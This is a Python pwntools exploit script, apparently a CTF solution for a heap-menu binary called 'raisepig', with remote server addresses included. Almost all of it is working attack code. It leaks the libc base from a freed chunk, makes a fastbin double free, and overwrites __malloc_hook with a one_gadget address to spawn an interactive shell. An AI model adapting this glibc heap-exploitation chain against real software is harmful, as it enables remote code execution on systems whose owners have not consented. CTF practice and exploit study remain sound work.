#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

os.environ["LD_LIBRARY_PATH"]="/home/moonagirl/moonagirl/libc/libc_local_x64"
libc=ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 1
if LOCAL:
#    context.log_level = 'debug'
    io = process('./raisepig')#,env={"LD_PRELOAD":"./libc-2.24.so"})
#    __malloc_hook+68
    
else:
    main_arena_off = 0x3c4b78
    #io = remote("47.90.103.10", 6000)
    io = remote("47.97.190.1", 6000)

def z(a=''):
    gdb.attach(io,a)
    if a == '':
        raw_input()

def debug():
    log.debug("libc Raiseress 0x%x"%libc_Raiseress)
    log.debug("process pid:%d"%pid)
    pause()

def Raise(namelen,name,t):
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("Length of the name :",str(namelen))
    io.sendafter("The name of pig :",name)
    io.sendlineafter("The type of the pig :",t)

def Visit(index):
    io.sendlineafter("Your choice :","2")
    io.recvuntil("Name[%d] :"%index)
    name=io.recvline()
    io.recvuntil("Type[%d] :"%index)
    t=io.recvline()
    return name,t

def Eat_a_pig(index):
    io.sendlineafter("Your choice :","3")
    io.sendlineafter("Which pig do you want to Eat_a_pig:",str(index))

def Eat_whole_pig():
    io.sendlineafter("Your choice :","4")

def pwnit():
    Raise(0x100,"a","t")#0
    Raise(0x10,"a","t")#1
    Eat_a_pig(0)
    Raise(0xd0,"a"*8,"t")#2
    #io.interactive()
    name,t=Visit(2)
    malloc_hook = libc.symbols['__malloc_hook']
    #libc_Raiseress=u64(name[8:14]+"\x00\x00")-0x3c4b78
    libc_address=u64(name[8:14]+"\x00\x00")- malloc_hook - 0x68
    success('libc_base:'+hex(libc_address))
    Raise(0x60,"a","t")#3
    Raise(0x60,"a","t")#4
    #Raise(0x10000,"a"*0x10000,"t")#5
    #make fastbin(0x70) loop
    Eat_a_pig(3)
    Eat_a_pig(4)
    Eat_a_pig(3)
    success('__free_hook:'+hex(libc.symbols["__free_hook"]+libc_address))#atoi
    success('atoi:'+hex(libc.symbols["atoi"]+libc_address))
#    z()
    Raise(0x60,p64(libc.symbols["__malloc_hook"]+libc_address-19),"t")
#    z()
    Raise(0x60,"a","t")
#    z()
    Raise(0x60,"a","t")
    #gadget=[0xf1147,0xf02a4]
    gadget=[0xf1117,0xf0274,0x4526a,0x45216]
    one_gadget = gadget[2]+libc_address
    #debug()
    Raise(0x60,"a"*3+p64(one_gadget),"t")
    success('__malloc_hook:'+hex(libc.symbols["__malloc_hook"]+libc_address))
    success('one_gadget:'+hex(one_gadget))
    io.interactive()
#    z()
#    Eat_a_pig(8)
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.interactive()

if __name__ == "__main__":
    pwnit()